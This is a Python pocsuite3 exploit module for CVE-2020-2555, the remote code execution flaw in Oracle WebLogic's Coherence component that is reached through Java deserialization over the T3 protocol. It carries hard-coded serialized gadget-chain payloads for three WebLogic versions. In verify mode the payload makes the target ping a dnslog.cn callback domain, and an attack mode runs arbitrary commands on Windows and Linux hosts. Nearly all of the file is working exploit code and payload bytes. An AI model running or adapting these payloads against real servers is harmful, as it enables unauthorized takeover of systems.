#!/usr/bin/env python3
#coding=utf-8

import random
import json
import time
import os
import re
import socket
import sys
import struct
from collections import OrderedDict

# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
from pocsuite3.api import logger
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger, OptDict
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


'''
CVE-2020-2555

gadget调用链：

javax.management.BadAttributeValueExpException#readObject()->
    coherence.jar!com.tangosol.util.filter.LimitFilter#toString()->
        coherence.jar!com.tangosol.util.extractor.ChainedExtractor#extract()->
            coherence.jar!com.tangosol.util.extractor.ReflectionExtractor#extract()->
                Method#invoke()->
                ...
                coherence.jar!com.tangosol.util.extractor.ReflectionExtractor#extract()->
                    Method#invoke()->
                        Runtime#exec()

tested on:
- weblogic 12.1.3.0.0, jdk_1.7.0_80
- weblogic 12.1.3.0.0, jdk_1.8.0_201
- weblogic 12.2.1.3.0, jdk_1.8.0_172
- weblogic 12.2.1.4.0, jdk_1.8.0_172
'''
class Weblogic_2020_2555(POCBase):
    vulID = 'Weblogic-CVE-2020-2555'
    appName = 'Coherence'
    appVersion = 'Coherence 3.7.1.17, 12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2020-04-20'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-20'  # 编写 PoC 的日期
    updateDate = '2021-04-21'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://github.com/0nise/CVE-2020-2555']  # 漏洞地址来源,0day不用写
    name = 'Weblogic coherence 反序列化RCE via t3'  # PoC 名称
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'qq.dnslog.cn'
    BANNER = ''.join([random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(10)])
    CEYE_URL = 'http://admin.dnslog.cn/api/dns/qq/{0}.weblogic-CVE-2020-2555/'.format( BANNER)


    def _verify(self, p_cmd="ping {0}.{1}".format(BANNER, DOMAIN)):
        result={}

        target_url = self.url

        host, port = url2ip(target_url, True)
        logger.info("检查端口开放情况...")
        # 端口都不开放就不浪费时间了
        if not self.is_port_open(host, port):
            logger.info("端口不开放! 退出!")
            return

        default_cmd = "ping {0}.{1}".format(self.BANNER, self.DOMAIN)
        cmd = p_cmd

        # 解析weblogic的t3版本
        w_version = self.send_header_via_t3(host, port)

        poc = None
        exp = None
        # 命令未改变，表示是verify模式
        if cmd==default_cmd:
            poc = self.send_poc(host, port, w_version)
        # 命令改变，表示是attack模式
        else:
            exp = self.send_exp(host, port, w_version, cmd)
        

        # 输出结果
        if poc:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            result['VerifyInfo']['Version'] = w_version
            result['VerifyInfo']['Payload'] = cmd
            return self.save_output(result)
        elif exp:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            result['VerifyInfo']['Version'] = w_version
            result['VerifyInfo']['Payload'] = cmd
        return self.save_output(result)


    def is_port_open(self, p_host, p_port):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(2)
        try:
            sk.connect((p_host, p_port))
            print('Server port is OK!')
        except Exception as e:    # 碰到异常认为端口未开放，返回False
            sk.close()
            return False
        
        sk.close()
        # 没问题就返回True
        return True


    # 只是用来解析weblogic t3版本的
    def send_header_via_t3(self, p_host, p_port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)

        server_address = (p_host, int(p_port))
        logger.info("探测Weblogic版本...")
        print('[+] Connecting to %s port %s' % server_address)
        sock.connect(server_address)
        # t3协议握手
        headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
        print('sending "%s"' % headers)
        sock.send(headers.encode())

        data = sock.recv(1024)
        version = self.get_version_by_t3(data)

        logger.info("Weblogic版本：")
        logger.info(version)

        return version


    # 用t3协议包裹反序列化数据payload
    def send_via_t3(self, p_host, p_port, p_payloadObj):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        server_address = (p_host, int(p_port))
        print('[+] Connecting to %s port %s' % server_address)
        sock.connect(server_address)
        
        # t3协议握手
        headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
        print('sending "%s"' % headers)
        sock.send(headers.encode())
        
        data = sock.recv(1024)
        print('received "%s"' % data)
        
        # 读取已生成的序列化文件
        #payloadObj = bytes.fromhex(p_payloadObj)
        payloadObj = p_payloadObj
        
        # 用t3协议将序列化对象包裹起来
        payload = b'\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'
        payload = payload + payloadObj
        payload = payload + b'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'
        
        # 最后根据句payload长度调整header的长度，使其符合协议规定
        payload=struct.pack('>I',len(payload)) + payload[4:]
        
        print('[+] Sending payload...')
        logger.info(payload)
        sock.send(payload)
        #data = sock.recv(1024)
        #print('received "%s"' % data)
        sock.close()

        
    def send_poc(self, p_host, p_port, p_version):
        # 这里为了避免对ysoserial的jar包依赖

        # 12.1.3.0.0 ping self.BANNER.weblogic-CVE-2020-2555.qq.dnslog.cn
        payloadObj_str_12_1_3_0 = b'\xac\xed\x00\x05sr\x00.javax.management.BadAttributeValueExpException\xd4\xe7\xda\xabc-F@\x02\x00\x01L\x00\x03valt\x00\x12Ljava/lang/Object;xr\x00\x13java.lang.Exception\xd0\xfd\x1f>\x1a;\x1c\xc4\x02\x00\x00xr\x00\x13java.lang.Throwable\xd5\xc65\'9w\xb8\xcb\x03\x00\x04L\x00\x05causet\x00\x15Ljava/lang/Throwable;L\x00\rdetailMessaget\x00\x12Ljava/lang/String;[\x00\nstackTracet\x00\x1e[Ljava/lang/StackTraceElement;L\x00\x14suppressedExceptionst\x00\x10Ljava/util/List;xpq\x00~\x00\x08pur\x00\x1e[Ljava.lang.StackTraceElement;\x02F*<<\xfd"9\x02\x00\x00xp\x00\x00\x00\x01sr\x00\x1bjava.lang.StackTraceElementa\t\xc5\x9a&6\xdd\x85\x02\x00\x04I\x00\nlineNumberL\x00\x0edeclaringClassq\x00~\x00\x05L\x00\x08fileNameq\x00~\x00\x05L\x00\nmethodNameq\x00~\x00\x05xp\x00\x00\x00Rt\x00\x1acom.supeream.CVE_2020_2555t\x00\x12CVE_2020_2555.javat\x00\x04mainsr\x00&java.util.Collections$UnmodifiableList\xfc\x0f%1\xb5\xec\x8e\x10\x02\x00\x01L\x00\x04listq\x00~\x00\x07xr\x00,java.util.Collections$UnmodifiableCollection\x19B\x00\x80\xcb^\xf7\x1e\x02\x00\x01L\x00\x01ct\x00\x16Ljava/util/Collection;xpsr\x00\x13java.util.ArrayListx\x81\xd2\x1d\x99\xc7a\x9d\x03\x00\x01I\x00\x04sizexp\x00\x00\x00\x00w\x04\x00\x00\x00\x00xq\x00~\x00\x15xsr\x00$com.tangosol.util.filter.LimitFilter\x99\x02%\x96\xd7\xb4YS\x02\x00\x06I\x00\x0bm_cPageSizeI\x00\x07m_nPageL\x00\x0cm_comparatort\x00\x16Ljava/util/Comparator;L\x00\x08m_filtert\x00\x1aLcom/tangosol/util/Filter;L\x00\x0fm_oAnchorBottomq\x00~\x00\x01L\x00\x0cm_oAnchorTopq\x00~\x00\x01xp\x00\x00\x00\x00\x00\x00\x00\x00sr\x00,com.tangosol.util.extractor.ChainedExtractor\x88\x9f\x81\xb0\x94][\x7f\x02\x00\x00xr\x006com.tangosol.util.extractor.AbstractCompositeExtractor\x08k=\x8c\x05i\x0fD\x02\x00\x01[\x00\x0cm_aExtractort\x00#[Lcom/tangosol/util/ValueExtractor;xr\x00-com.tangosol.util.extractor.AbstractExtractore\x81\x950>r8!\x02\x00\x01I\x00\tm_nTargetxp\x00\x00\x00\x00ur\x002[Lcom.tangosol.util.extractor.ReflectionExtractor;\xdd\x8b\x89\xae\xd7\x02s\xca\x02\x00\x00xp\x00\x00\x00\x03sr\x00/com.tangosol.util.extractor.ReflectionExtractor\xeez\xe9\x95\xc0/\xb4\xa2\x02\x00\x02[\x00\tm_aoParamt\x00\x13[Ljava/lang/Object;L\x00\tm_sMethodq\x00~\x00\x05xq\x00~\x00\x1d\x00\x00\x00\x00ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x02t\x00\ngetRuntimeur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00t\x00\tgetMethodsq\x00~\x00!\x00\x00\x00\x00uq\x00~\x00$\x00\x00\x00\x02puq\x00~\x00$\x00\x00\x00\x00t\x00\x06invokesq\x00~\x00!\x00\x00\x00\x00uq\x00~\x00$\x00\x00\x00\x01ur\x00\x13[Ljava.lang.String;\xad\xd2V\xe7\xe9\x1d{G\x02\x00\x00xp\x00\x00\x00\x01t\x000ping '                                                                                                                                               + self.BANNER.encode() + b'.weblogic-CVE-2020-2555.qq.dnslog.cnt'

        # 12.2.1.3.0 ping self.BANNER.weblogic-CVE-2020-2555.qq.dnslog.cn
        payloadObj_str_12_2_1_3 = b'\xac\xed\x00\x05sr\x00.javax.management.BadAttributeValueExpException\xd4\xe7\xda\xabc-F@\x02\x00\x01L\x00\x03valt\x00\x12Ljava/lang/Object;xr\x00\x13java.lang.Exception\xd0\xfd\x1f>\x1a;\x1c\xc4\x02\x00\x00xr\x00\x13java.lang.Throwable\xd5\xc65\'9w\xb8\xcb\x03\x00\x04L\x00\x05causet\x00\x15Ljava/lang/Throwable;L\x00\rdetailMessaget\x00\x12Ljava/lang/String;[\x00\nstackTracet\x00\x1e[Ljava/lang/StackTraceElement;L\x00\x14suppressedExceptionst\x00\x10Ljava/util/List;xpq\x00~\x00\x08pur\x00\x1e[Ljava.lang.StackTraceElement;\x02F*<<\xfd"9\x02\x00\x00xp\x00\x00\x00\x01sr\x00\x1bjava.lang.StackTraceElementa\t\xc5\x9a&6\xdd\x85\x02\x00\x04I\x00\nlineNumberL\x00\x0edeclaringClassq\x00~\x00\x05L\x00\x08fileNameq\x00~\x00\x05L\x00\nmethodNameq\x00~\x00\x05xp\x00\x00\x00Rt\x00\x1acom.supeream.CVE_2020_2555t\x00\x12CVE_2020_2555.javat\x00\x04mainsr\x00&java.util.Collections$UnmodifiableList\xfc\x0f%1\xb5\xec\x8e\x10\x02\x00\x01L\x00\x04listq\x00~\x00\x07xr\x00,java.util.Collections$UnmodifiableCollection\x19B\x00\x80\xcb^\xf7\x1e\x02\x00\x01L\x00\x01ct\x00\x16Ljava/util/Collection;xpsr\x00\x13java.util.ArrayListx\x81\xd2\x1d\x99\xc7a\x9d\x03\x00\x01I\x00\x04sizexp\x00\x00\x00\x00w\x04\x00\x00\x00\x00xq\x00~\x00\x15xsr\x00$com.tangosol.util.filter.LimitFilter\xab)\x01\xb9v\xc4\xe2q\x02\x00\x06I\x00\x0bm_cPageSizeI\x00\x07m_nPageL\x00\x0cm_comparatort\x00\x16Ljava/util/Comparator;L\x00\x08m_filtert\x00\x1aLcom/tangosol/util/Filter;L\x00\x0fm_oAnchorBottomq\x00~\x00\x01L\x00\x0cm_oAnchorTopq\x00~\x00\x01xr\x004com.tangosol.util.filter.AbstractQueryRecorderFilter\xf3\xb9\x82\x01\xf6\x80\xeb\x90\x02\x00\x00xp\x00\x00\x00\x00\x00\x00\x00\x00sr\x00,com.tangosol.util.extractor.ChainedExtractor\x06\xee\x10C:L\xc4\xb4\x02\x00\x00xr\x006com.tangosol.util.extractor.AbstractCompositeExtractor\x08k=\x8c\x05i\x0fD\x02\x00\x01[\x00\x0cm_aExtractort\x00#[Lcom/tangosol/util/ValueExtractor;xr\x00-com.tangosol.util.extractor.AbstractExtractoru"\x89\xadMF\x018\x02\x00\x01I\x00\tm_nTargetxp\x00\x00\x00\x00ur\x002[Lcom.tangosol.util.extractor.ReflectionExtractor;\xdd\x8b\x89\xae\xd7\x02s\xca\x02\x00\x00xp\x00\x00\x00\x03sr\x00/com.tangosol.util.extractor.ReflectionExtractor\x87\x977\x91\xb2d)\xdd\x02\x00\x03[\x00\tm_aoParamt\x00\x13[Ljava/lang/Object;L\x00\x11m_extractorCachedq\x00~\x00\x01L\x00\tm_sMethodq\x00~\x00\x05xq\x00~\x00\x1e\x00\x00\x00\x00ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x02t\x00\ngetRuntimeur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00pt\x00\tgetMethodsq\x00~\x00"\x00\x00\x00\x00uq\x00~\x00%\x00\x00\x00\x02puq\x00~\x00%\x00\x00\x00\x00pt\x00\x06invokesq\x00~\x00"\x00\x00\x00\x00uq\x00~\x00%\x00\x00\x00\x01ur\x00\x13[Ljava.lang.String;\xad\xd2V\xe7\xe9\x1d{G\x02\x00\x00xp\x00\x00\x00\x01t\x000ping ' + self.BANNER.encode() + b'.weblogic-CVE-2020-2555.qq.dnslog.cnpt'

        # 12.2.1.4.0 ping self.BANNER.weblogic-CVE-2020-2555.qq.dnslog.cn
        payloadObj_str_12_2_1_4 = b'\xac\xed\x00\x05sr\x00.javax.management.BadAttributeValueExpException\xd4\xe7\xda\xabc-F@\x02\x00\x01L\x00\x03valt\x00\x12Ljava/lang/Object;xr\x00\x13java.lang.Exception\xd0\xfd\x1f>\x1a;\x1c\xc4\x02\x00\x00xr\x00\x13java.lang.Throwable\xd5\xc65\'9w\xb8\xcb\x03\x00\x04L\x00\x05causet\x00\x15Ljava/lang/Throwable;L\x00\rdetailMessaget\x00\x12Ljava/lang/String;[\x00\nstackTracet\x00\x1e[Ljava/lang/StackTraceElement;L\x00\x14suppressedExceptionst\x00\x10Ljava/util/List;xpq\x00~\x00\x08pur\x00\x1e[Ljava.lang.StackTraceElement;\x02F*<<\xfd"9\x02\x00\x00xp\x00\x00\x00\x01sr\x00\x1bjava.lang.StackTraceElementa\t\xc5\x9a&6\xdd\x85\x02\x00\x04I\x00\nlineNumberL\x00\x0edeclaringClassq\x00~\x00\x05L\x00\x08fileNameq\x00~\x00\x05L\x00\nmethodNameq\x00~\x00\x05xp\x00\x00\x00Rt\x00\x1acom.supeream.CVE_2020_2555t\x00\x12CVE_2020_2555.javat\x00\x04mainsr\x00&java.util.Collections$UnmodifiableList\xfc\x0f%1\xb5\xec\x8e\x10\x02\x00\x01L\x00\x04listq\x00~\x00\x07xr\x00,java.util.Collections$UnmodifiableCollection\x19B\x00\x80\xcb^\xf7\x1e\x02\x00\x01L\x00\x01ct\x00\x16Ljava/util/Collection;xpsr\x00\x13java.util.ArrayListx\x81\xd2\x1d\x99\xc7a\x9d\x03\x00\x01I\x00\x04sizexp\x00\x00\x00\x00w\x04\x00\x00\x00\x00xq\x00~\x00\x15xsr\x00$com.tangosol.util.filter.LimitFilter\x95NE\x90\xbe\x89\x86_\x02\x00\x06I\x00\x0bm_cPageSizeI\x00\x07m_nPageL\x00\x0cm_comparatort\x00\x16Ljava/util/Comparator;L\x00\x08m_filtert\x00\x1aLcom/tangosol/util/Filter;L\x00\x0fm_oAnchorBottomq\x00~\x00\x01L\x00\x0cm_oAnchorTopq\x00~\x00\x01xr\x004com.tangosol.util.filter.AbstractQueryRecorderFilter\xf3\xb9\x82\x01\xf6\x80\xeb\x90\x02\x00\x00xp\x00\x00\x00\x00\x00\x00\x00\x00sr\x00,com.tangosol.util.extractor.ChainedExtractorC[%\x0br\xf6=\xb5\x02\x00\x00xr\x006com.tangosol.util.extractor.AbstractCompositeExtractor\x08k=\x8c\x05i\x0fD\x02\x00\x01[\x00\x0cm_aExtractort\x00#[Lcom/tangosol/util/ValueExtractor;xr\x00-com.tangosol.util.extractor.AbstractExtractor\x9b\x1b\xe1\x8e\xd7\x01\x00\xe5\x02\x00\x01I\x00\tm_nTargetxp\x00\x00\x00\x00ur\x002[Lcom.tangosol.util.extractor.ReflectionExtractor;\xdd\x8b\x89\xae\xd7\x02s\xca\x02\x00\x00xp\x00\x00\x00\x03sr\x00/com.tangosol.util.extractor.ReflectionExtractor\x1fb\xf5d\xb9Q\xb6\x14\x02\x00\x02[\x00\tm_aoParamt\x00\x13[Ljava/lang/Object;L\x00\tm_sMethodq\x00~\x00\x05xq\x00~\x00\x1e\x00\x00\x00\x00ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x02t\x00\ngetRuntimeur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00t\x00\tgetMethodsq\x00~\x00"\x00\x00\x00\x00uq\x00~\x00%\x00\x00\x00\x02puq\x00~\x00%\x00\x00\x00\x00t\x00\x06invokesq\x00~\x00"\x00\x00\x00\x00uq\x00~\x00%\x00\x00\x00\x01ur\x00\x13[Ljava.lang.String;\xad\xd2V\xe7\xe9\x1d{G\x02\x00\x00xp\x00\x00\x00\x01t\x000ping '                                  + self.BANNER.encode() + b'.weblogic-CVE-2020-2555.qq.dnslog.cnt'

        if p_version == '12.2.1.4.0':
            self.send_via_t3(p_host, p_port, payloadObj_str_12_2_1_4)
        elif p_version == '12.2.1.3.0':
            self.send_via_t3(p_host, p_port, payloadObj_str_12_2_1_3)
        elif p_version == '12.1.3.0.0':
            self.send_via_t3(p_host, p_port, payloadObj_str_12_1_3_0)

        time.sleep(2)   # 等待ceye记录生成
        if self.test_dnslog(self.CEYE_URL):
            result = {}
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Version'] = p_version
            return self.save_output(result)

        return None


    def send_exp(self, p_host, p_port, p_version, p_cmd):
        [payloadObj_win, payloadObj_lin] = self.gen_custom_payload(p_version, p_cmd)
        self.send_via_t3(p_host, p_port, bytes.fromhex(payloadObj_win))
        self.send_via_t3(p_host, p_port, bytes.fromhex(payloadObj_lin))

        return True


    # 根据不同命令、不同版本返回对应的payload
    def gen_custom_payload(self, p_version, p_cmd):
        # 12.2.1.4 cmd /c calc 
        #ser_12_2_1_4_cmd_c_calc = "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174001a636f6d2e737570657265616d2e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c746572954e4590be89865f02000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e000178720034636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e416273747261637451756572795265636f7264657246696c746572f3b98201f680eb90020000787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72435b250b72f63db502000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f729b1be18ed70100e50200014900096d5f6e546172676574787000000000757200325b4c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723bdd8b89aed70273ca0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f721f62f564b951b6140200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e001e00000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e0022000000007571007e002500000002707571007e002500000000740006696e766f6b657371007e0022000000007571007e002500000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000374"                                                       + "0003" + "636d64"  + "74" + "0002" + "2f63" + "74" + "0004" + "63616c63" + "74" + "0004" + "657865637070767200116a6176612e6c616e672e52756e74696d6500000000000000000000007870"
